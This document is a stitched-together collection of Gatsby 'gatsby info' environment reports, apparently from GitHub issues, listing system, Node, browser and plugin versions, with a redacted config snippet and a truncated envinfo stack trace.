system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 10.8.0 - ~/.nvm/versions/node/v10.8.0/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 6.2.0 - ~/.nvm/versions/node/v10.8.0/bin/npm browsers: chrome: 69.0.3497.100 firefox: 62.0.3 safari: 12.0 npmpackages: gatsby: ^2.0.19 => 2.0.21 gatsby-image: ^2.0.13 => 2.0.13 gatsby-plugin-google-analytics: ^2.0.6 => 2.0.6 gatsby-plugin-google-fonts: ^0.0.4 => 0.0.4 gatsby-plugin-manifest: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.6 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.6 => 2.0.6 gatsby-plugin-styled-components: ^3.0.0 => 3.0.0 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-remark-prismjs: ^3.0.2 => 3.0.2 gatsby-source-contentful: ^2.0.3 => 2.0.3 gatsby-source-filesystem: ^2.0.3 => 2.0.3 gatsby-transformer-remark: ^2.1.7 => 2.1.7 gatsby-transformer-sharp: ^2.1.3 => 2.1.3 npmglobalpackages: gatsby-cli: 2.4.3 gatsby: 1.9.277
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.6.2 - /usr/local/bin/zsh binaries: node: 10.11.0 - /usr/local/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: ^2.0.17 => 2.0.17 gatsby-plugin-canonical-urls: ^2.0.6 => 2.0.6 gatsby-plugin-catch-links: ^2.0.3 => 2.0.3 gatsby-plugin-google-analytics: ^2.0.6 => 2.0.6 gatsby-plugin-layout: ^1.0.3 => 1.0.3 gatsby-plugin-manifest: ^2.0.4 => 2.0.4 gatsby-plugin-netlify: ^2.0.1 => 2.0.1 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-nprogress: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-resolve-src: ^1.1.4 => 1.1.4 gatsby-plugin-sharp: ^2.0.5 => 2.0.5 gatsby-plugin-styled-components: ^3.0.0 => 3.0.0 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-remark-autolink-headers: ^2.0.6 => 2.0.6 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.5 gatsby-remark-images: ^2.0.3 => 2.0.3 gatsby-remark-prismjs: ^3.0.1 => 3.0.1 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.5 gatsby-remark-smartypants: ^2.0.5 => 2.0.5 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-transformer-json: ^2.1.3 => 2.1.3 gatsby-transformer-remark: ^2.1.6 => 2.1.6 gatsby-transformer-sharp: ^2.1.3 => 2.1.3 npmglobalpackages: gatsby-cli: 2.4.1 gatsby-dev-cli: 1.2.12
system: os: windows 10 mobile os: ios 12.1 public beta 3
binaries: yarn: 1.9.4 npm: 6.3.0
browsers: google chrome: 69.0.3497.100 google chrome on iphone (latest version) safari on ios (latest version)
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0.2 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.18 gatsby-image: ^2.0.0-rc.4 => 2.0.0-rc.4 gatsby-plugin-google-fonts: 0.0.4 => 0.0.4 gatsby-plugin-manifest: ^2.0.2 => 2.0.4 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-plugin-stylus: next => 2.0.0-rc.1 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-source-wordpress: ^3.0.1 => 3.0.1 gatsby-transformer-sharp: ^2.1.1-rc.3 => 2.1.1-rc.3 npmglobalpackages: gatsby-cli: 2.4.2
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.3.0 - ~/.nvm/versions/node/v10.3.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.3.0/bin/npm browsers: chrome: 69.0.3497.100 firefox: 63.0 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.19 gatsby-plugin-catch-links: ^2.0.4 => 2.0.4 gatsby-plugin-manifest: ^2.0.2 => 2.0.4 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-source-filesystem: ^2.0.2 => 2.0.2 gatsby-transformer-remark: ^2.1.6 => 2.1.6
system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: x64 intel(r) core(tm) i5-7400 cpu @ 3.00ghz shell: 4.4.19 - /bin/bash binaries: node: 8.12.0 - /usr/bin/node yarn: 1.10.1 - /usr/bin/yarn npm: 6.4.1 - /usr/bin/npm browsers: chrome: 69.0.3497.100 firefox: 62.0.3 npmpackages: gatsby: ^2.0.0 => 2.0.18 gatsby-image: ^2.0.5 => 2.0.13 gatsby-plugin-catch-links: ^2.0.2 => 2.0.3 gatsby-plugin-glamor: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.0.5 => 2.0.6 gatsby-plugin-typography: ^2.2.0 => 2.2.0 gatsby-remark-autolink-headers: ^2.0.5 => 2.0.6 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.5 gatsby-remark-images: ^2.0.1 => 2.0.3 gatsby-remark-katex: ^2.0.5 => 2.0.5 gatsby-remark-prismjs: ^3.0.0 => 3.0.1 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.5 gatsby-remark-smartypants: ^2.0.5 => 2.0.5 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-transformer-remark: ^2.1.1 => 2.1.6 gatsby-transformer-sharp: ^2.1.1 => 2.1.3 gatsby-transformer-yaml: ^2.1.1 => 2.1.1 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 8.11.3 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.7 gatsby-plugin-emotion: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-source-graphql: ^2.0.2 => 2.0.2 gatsby-transformer-remark: ^2.1.3 => 2.1.3 ```
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.11.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 firefox: 62.0 safari: 12.0 npmpackages: gatsby: ^2.0.0 => 2.0.9 gatsby-plugin-eslint: ^2.0.1 => 2.0.1 gatsby-plugin-extract-schema: ^0.0.4 => 0.0.4 gatsby-plugin-manifest: ^2.0.2 => 2.0.4 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-styled-components: ^3.0.0 => 3.0.0 gatsby-plugin-stylelint: ^2.0.0 => 2.0.0 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-transformer-remark: ^2.1.4 => 2.1.4 ```
system: os: windows 10 cpu: x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz binaries: yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.6.0 - c:\\program files\ odejs\ pm.cmd npmpackages: gatsby: ^2.0.0 => 2.0.6 gatsby-image: ^2.0.9 => 2.0.9 gatsby-plugin-manifest: ^2.0.2 => 2.0.2 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.0.1 => 2.0.1 gatsby-source-datocms: ^2.0.0-alpha.6 => 2.0.0-alpha.6
system: os: windows 10 cpu: x64 intel(r) core(tm) i5-6500 cpu @ 3.20ghz binaries: yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 41.16299.611.0 npmpackages: gatsby: ^2.0.9 => 2.0.9 gatsby-image: ^2.0.8 => 2.0.9 gatsby-link: ^2.0.1 => 2.0.1 gatsby-plugin-catch-links: ^2.0.2 => 2.0.3 gatsby-plugin-google-tagmanager: ^2.0.5 => 2.0.5 gatsby-plugin-manifest: ^2.0.2 => 2.0.3 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.0 => 2.0.0 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sass: ^2.0.1 => 2.0.1 gatsby-plugin-sharp: ^2.0.5 => 2.0.5 gatsby-plugin-sitemap: ^2.0.1 => 2.0.1 gatsby-remark-images: ^2.0.1 => 2.0.2 gatsby-source-contentful: ^2.0.1 => 2.0.1 gatsby-transformer-remark: ^2.1.3 => 2.1.3 gatsby-transformer-sharp: ^2.1.1 => 2.1.2
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 3.2.57 - /bin/bash binaries: node: 8.10.0 - ~/.nvm/versions/node/v8.10.0/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v8.10.0/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: 2.0.7 => 2.0.7 gatsby-plugin-catch-links: 2.0.2 => 2.0.2 gatsby-plugin-google-analytics: 2.0.6 => 2.0.6 gatsby-plugin-mailchimp: #gatsby-v2 => 3.3.0 gatsby-plugin-manifest: 2.0.2 => 2.0.2 gatsby-plugin-offline: 2.0.5 => 2.0.5 gatsby-plugin-react-helmet: 3.0.0 => 3.0.0 gatsby-plugin-sass: 2.0.1 => 2.0.1 gatsby-plugin-sharp: ^2.0.5 => 2.0.5 gatsby-plugin-sitemap: 2.0.1 => 2.0.1 gatsby-remark-autolink-headers: 2.0.6 => 2.0.6 gatsby-remark-copy-images: 0.2.1 => 0.2.1 gatsby-remark-copy-linked-files: 2.0.5 => 2.0.5 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: 2.0.1 => 2.0.1 gatsby-remark-prismjs: 3.0.0 => 3.0.0 gatsby-remark-responsive-image: ^1.0.0-alpha13-alpha.435e0178 => 1.0.0-beta.5-alpha.fb30fcd6 gatsby-source-filesystem: 2.0.1 => 2.0.1 gatsby-transformer-remark: 2.1.3 => 2.1.3 gatsby-transformer-sharp: 2.1.1 => 2.1.1 npmglobalpackages: gatsby-cli: 1.1.58
gatsby-node.js: ```js
module.exports = { sitemetadata: { siteurl: \'----\' }, plugins: [ \'gatsby-plugin-sitemap\', \'gatsby-plugin-react-helmet\', \'gatsby-plugin-styled-components\', \'gatsby-plugin-less\', \'gatsby-plugin-catch-links\', \'gatsby-plugin-remove-trailing-slashes\', { resolve: `gatsby-plugin-favicon`, options: { logo: "./src/assets/logos/favicon.png" } }, { resolve: \'gatsby-source-contentful\', options: { spaceid: \'----\', accesstoken: \'----\' } }, { resolve: \'gatsby-plugin-canonical-urls\', options: { siteurl: \'---- \' } } ]
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.10.0 - ~/.nvm/versions/node/v8.10.0/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.10.0/bin/npm browsers: chrome: 69.0.3497.100 firefox: 62.0 safari: 12.0 npmpackages: gatsby: 2.0.7 => 2.0.7 gatsby-plugin-canonical-urls: 2.0.5 => 2.0.5 gatsby-plugin-catch-links: 2.0.2 => 2.0.2 gatsby-plugin-create-client-paths: 2.0.0 => 2.0.0 gatsby-plugin-favicon: 3.1.4 => 3.1.4 gatsby-plugin-google-analytics: 2.0.5 => 2.0.5 gatsby-plugin-google-tagmanager: 2.0.5 => 2.0.5 gatsby-plugin-less: 2.0.5 => 2.0.5 gatsby-plugin-react-helmet: 3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.0 => 2.0.0 gatsby-plugin-sitemap: 2.0.1 => 2.0.1 gatsby-plugin-styled-components: 3.0.0 => 3.0.0 gatsby-source-contentful: 2.0.1 => 2.0.1 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-6920hq cpu @ 2.90ghz shell: 2.7.1 - /usr/local/bin/fish binaries: node: 8.11.3 - /usr/local/bin/node yarn: 1.9.4 - ~/.yarn/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: ^2.0.6 => 2.0.6 gatsby-image: ^1.0.55 => 1.0.55 gatsby-plugin-favicon: ^3.1.4 => 3.1.4 gatsby-plugin-glamor: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-nprogress: ^2.0.0-beta.4 => 2.0.0-beta.4 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.0-beta.3 => 2.0.0-beta.3 gatsby-plugin-sharp: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-plugin-sitemap: ^2.0.0-beta.3 => 2.0.0-beta.3 gatsby-plugin-typescript: ^2.0.0-rc.4 => 2.0.0-rc.4 gatsby-remark-autolink-headers: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-remark-copy-linked-files: ^2.0.0-rc.5 => 2.0.0-rc.5 gatsby-remark-highlights: ^1.3.4 => 1.3.4 gatsby-remark-images: ^2.0.1 => 2.0.1 gatsby-remark-prismjs: ^1.2.16-9 => 1.2.24 gatsby-source-filesystem: ^2.0.0-alpha.13 => 2.0.0-alpha.f98688ee gatsby-transformer-remark: ^2.1.3 => 2.1.3 gatsby-transformer-sharp: ^2.1.1-rc.3 => 2.1.1-rc.3 npmglobalpackages: gatsby-cli: 2.0.0-rc.1 gatsby: 1.9.260
``` ### additional my use case for a consistent schema is so that i can generate my typescript types from it, however the changing schema is resulting in a lot of churn for my types.
system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.19 - /bin/bash binaries: node: 8.10.0 - /usr/bin/node yarn: 1.9.4 - /usr/bin/yarn npm: 3.5.2 - /usr/bin/npm browsers: chrome: 69.0.3497.81 firefox: 62.0 npmpackages: gatsby: ^2.0.0 => 2.0.4 gatsby-plugin-google-analytics: ^2.0.5 => 2.0.6 gatsby-plugin-offline: ^2.0.5 => 2.0.5 npmglobalpackages: gatsby-cli: 1.1.58
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-5575r cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: ^2.0.3 => 2.0.3 gatsby-cli: 2.0.0-rc.1 => 2.0.0-rc.1 gatsby-image: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-catch-links: ^2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-favicon: ^3.1.2 => 3.1.4 gatsby-plugin-manifest: 2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-netlify-cms: ^3.0.2 => 3.0.2 gatsby-plugin-node-fields: ^1.0.0 => 1.0.0 gatsby-plugin-offline: 2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-page-creator: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-react-helmet: 3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-remove-trailing-slashes: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-plugin-sharp: ^2.0.0-rc.2 => 2.0.0-rc.3 gatsby-plugin-styled-components: 3.0.0-rc.1 => 3.0.0-rc.1 gatsby-remark-copy-linked-files: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-remark-embed-video: ^1.4.0 => 1.4.0 gatsby-remark-images: ^2.0.1-rc.1 => 2.0.1-rc.1 gatsby-remark-responsive-iframe: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-remark-smartypants: ^2.0.0-rc.1 => 2.0.0-rc.1 gatsby-source-filesystem: ^2.0.1-rc.1 => 2.0.1-rc.1 gatsby-transformer-json: ^2.1.1-rc.6 => 2.1.1-rc.6 gatsby-transformer-remark: ^2.1.1-rc.1 => 2.1.1-rc.1 gatsby-transformer-sharp: ^2.1.1-rc.2 => 2.1.1-rc.2 npmglobalpackages: gatsby-cli: 2.0.0-beta.13 not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
not applicable
should be reproducible out of the box in all the environments
this is also related to not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.8.0 - ~/.nvm/versions/node/v10.8.0/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.0 - ~/.nvm/versions/node/v10.8.0/bin/npm browsers: chrome: 69.0.3497.100 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.28 gatsby-image: ^2.0.0-rc.2 => 2.0.6 gatsby-plugin-canonical-urls: next => 2.0.0-rc.2 gatsby-plugin-google-analytics: ^2.0.0-rc.2 => 2.0.6 gatsby-plugin-google-fonts: 0.0.4 => 0.0.4 gatsby-plugin-manifest: next => 2.0.2-rc.1 gatsby-plugin-netlify: next => 2.0.0-rc.6 gatsby-plugin-nprogress: next => 2.0.0-rc.1 gatsby-plugin-offline: next => 2.0.0-rc.9 gatsby-plugin-react-helmet: next => 3.0.0-rc.1 gatsby-plugin-sharp: ^2.0.0-rc.7 => 2.0.5 gatsby-plugin-sitemap: ^2.0.0-rc.2 => 2.0.1 gatsby-plugin-styled-components: ^3.0.0-rc.5 => 3.0.0 gatsby-remark-images-contentful: ^1.0.2 => 1.0.2 gatsby-remark-prismjs: next => 3.0.0-rc.2 gatsby-source-contentful: next => 2.0.1-rc.9 gatsby-source-filesystem: ^2.0.1-rc.6 => 2.0.1 gatsby-transformer-remark: ^2.1.1-rc.5 => 2.1.3 gatsby-transformer-sharp: ^2.1.1-rc.3 => 2.1.1 npmglobalpackages: gatsby-cli: 1.1.58 gatsby: 2.0.0-rc.0 ```
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 10.8.0 - ~/.nvm/versions/node/v10.8.0/bin/node npm: 6.4.1 - ~/.nvm/versions/node/v10.8.0/bin/npm browsers: chrome: 68.0.3440.106 safari: 12.0 npmglobalpackages: gatsby-cli: 2.4.0
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.6.2 - /usr/local/bin/zsh binaries: node: 10.10.0 - ~/.nvs/default/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvs/default/bin/npm browsers: chrome: 69.0.3497.100 safari: 12.0 npmpackages: gatsby: ^2.0.2 => 2.0.2 gatsby-image: ^2.0.5 => 2.0.5 gatsby-plugin-google-tagmanager: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.5 => 2.0.5 gatsby-plugin-typescript: ^2.0.0 => 2.0.0 gatsby-source-filesystem: ^2.0.1 => 2.0.1 gatsby-transformer-json: ^2.1.1 => 2.1.1 gatsby-transformer-remark: ^2.1.3 => 2.1.3 gatsby-transformer-sharp: ^2.1.1 => 2.1.1
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i5-7287u cpu @ 3.30ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.4 - ~/.nvm/versions/node/v8.9.4/bin/node yarn: 1.9.4 - ~/.nvm/versions/node/v8.9.4/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.9.4/bin/npm browsers: chrome: 69.0.3497.100 firefox: 60.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0 => 2.0.4 gatsby-plugin-react-css-modules: ^2.0.0 => 2.0.0 gatsby-plugin-sass: ^2.0.1 => 2.0.1 npmglobalpackages: gatsby-cli: 2.4.1
``` \x1b[4msystem:\x1b[0m os: linux 4.13 ubuntu 17.10 (artful aardvark) cpu: x64 intel(r) core(tm) i7-7600u cpu @ 2.80ghz shell: 5.2 - /usr/bin/zsh \x1b[4mbinaries:\x1b[0m node: 8.11.2 - /usr/bin/node npm: 6.4.1 - /usr/bin/npm \x1b[4mbrowsers:\x1b[0m chrome: 67.0.3396.62 firefox: 61.0.1 \x1b[4mnpmpackages:\x1b[0m gatsby: ^2.0.0-rc.28 => 2.0.0-rc.28 gatsby-image: ^2.0.0-rc.4 => 2.0.0-rc.4 gatsby-plugin-catch-links: ^2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-manifest: ^2.0.2-rc.1 => 2.0.2-rc.1 gatsby-plugin-react-helmet: ^3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-react-next: next => 2.0.1-13 gatsby-plugin-remove-trailing-slashes: ^1.0.9 => 1.0.9 gatsby-plugin-sass: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-plugin-sharp: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-plugin-sitemap: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-source-contentful: ^2.0.1-rc.9 => 2.0.1-rc.9 gatsby-source-filesystem: ^2.0.1-rc.6 => 2.0.1-rc.6 gatsby-transformer-sharp: ^2.1.1-rc.3 => 2.1.1-rc.3 gatsby-transformer-yaml: ^2.1.1-rc.6 => 2.1.1-rc.6 \x1b[4mnpmglobalpackages:\x1b[0m gatsby-cli: 2.4.1 ```
system: os: windows 10 cpu: x64 intel(r) core(tm) i7-3632qm cpu @ 2.20ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.6.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.0 => 2.0.1 gatsby-plugin-manifest: ^2.0.2 => 2.0.2 gatsby-plugin-nprogress: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.0 => 2.0.0
os: macos sierra 10.12.6
cpu: x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz
shell: 5.2 - /bin/zsh
node: 9.7.1 - ~/.nvm/versions/node/v9.7.1/bin/node
yarn: 1.5.1 - /usr/local/bin/yarn
npm: 6.0.0 - ~/.nvm/versions/node/v9.7.1/bin/npm
chrome: 67.0.3396.99
firefox: 57.0.4
safari: 11.0.1
npmpackages:
gatsby: 2.0.1 => 2.0.1
gatsby-cli: 2.0.1 => 2.0.1
system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: x64 intel(r) core(tm) i7-3720qm cpu @ 2.60ghz shell: 4.4.19 - /bin/bash binaries: node: 10.6.0 - ~/.nvm/versions/node/v10.6.0/bin/node yarn: 1.9.4 - ~/.nvm/versions/node/v10.6.0/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.6.0/bin/npm browsers: chrome: 68.0.3440.106 firefox: 62.0 npmpackages: gatsby: latest => 2.0.1 gatsby-image: latest => 2.0.5 gatsby-plugin-catch-links: latest => 2.0.2 gatsby-plugin-create-client-paths: latest => 2.0.0 gatsby-plugin-google-analytics: latest => 2.0.5 gatsby-plugin-netlify: latest => 2.0.0 gatsby-plugin-netlify-cache: latest => 0.1.0 gatsby-plugin-react-helmet: latest => 3.0.0 gatsby-plugin-sass: latest => 2.0.1 gatsby-plugin-sharp: latest => 2.0.5 gatsby-plugin-sitemap: latest => 2.0.1 gatsby-source-filesystem: latest => 2.0.1 gatsby-source-prismic-campjefferson: ^1.0.7 => 1.0.7 gatsby-transformer-sharp: latest => 2.1.1 npmglobalpackages: gatsby-cli: 2.4.0
running on arch linux install
running `gatsby info --clipboard` shows "error cannot read property \'1\' of null"...
``` system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.0 - ~/.nvm/versions/node/v8.9.0/bin/node yarn: 1.9.4 - ~/.yarn/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v8.9.0/bin/npm browsers: chrome: 69.0.3497.92 firefox: 62.0 safari: 12.0 npmpackages: gatsby: ^2.0.0-rc.23 => 2.0.0-rc.23 gatsby-plugin-catch-links: ^2.0.2-beta.10 => 2.0.2-beta.10 gatsby-plugin-favicon: ^3.1.2 => 3.1.2 gatsby-plugin-google-analytics: next => 2.0.0-beta.5 gatsby-plugin-manifest: ^1.0.27 => 1.0.27 gatsby-plugin-offline: ^1.0.18 => 1.0.18 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sass: next => 2.0.0-beta.10 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-sitemap: ^1.2.25 => 1.2.25 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-plugin-typography: next => 2.2.0-beta.3 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-autolink-headers: ^1.4.18 => 1.4.19 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-copy-linked-files: next => 2.0.0-beta.3 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-smartypants: next => 2.0.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.6 npmglobalpackages: gatsby-cli: 2.0.0-beta.13
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.3 - /bin/zsh binaries: node: 9.5.0 - ~/.nvm/versions/node/v9.5.0/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v9.5.0/bin/npm browsers: chrome: 69.0.3497.92 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-rc.15 => 2.0.0-rc.15 gatsby-image: ^2.0.0-rc.2 => 2.0.0-rc.2 gatsby-plugin-flow: ^1.0.1-rc.1 => 1.0.1-rc.1 gatsby-plugin-react-helmet: ^3.0.0-rc.1 => 3.0.0-rc.1 gatsby-plugin-sharp: ^2.0.0-rc.7 => 2.0.0-rc.7 gatsby-plugin-styled-components: ^3.0.0-rc.5 => 3.0.0-rc.5 gatsby-source-filesystem: ^2.0.1-rc.6 => 2.0.1-rc.6 gatsby-transformer-json: ^2.1.1-rc.6 => 2.1.1-rc.6 gatsby-transformer-sharp: ^2.1.1-rc.3 => 2.1.1-rc.3 ```
system: os: windows 10 cpu: x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz binaries: npm: 5.6.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 41.16299.371.0 npmpackages: gatsby: next => 2.0.0-rc.21 error the system cannot find the path specified
error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:7778 - envinfo.js:1 object.copysync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:104976 - envinfo.js:1 object.t.writesync.e [as writesync] [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:123499 - envinfo.js:1 [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:124274 - envinfo.js:1 promise.all.then.e [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:124289 - util.js:16 trycatcher [npm]/[gatsby-cli]/[bluebird]/js/release/util.js:16:23 - promise.js:512 promise._settlepromisefromhandler [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:512:31 - promise.js:569 promise._settlepromise [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:569:18 - promise.js:614 promise._settlepromise0 [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:614:10 - promise.js:694 promise._settlepromises [npm]/[gatsby-cli]/[bluebird]/js/release/promise.js:694:18 - promise.js:638 promise._fulfill 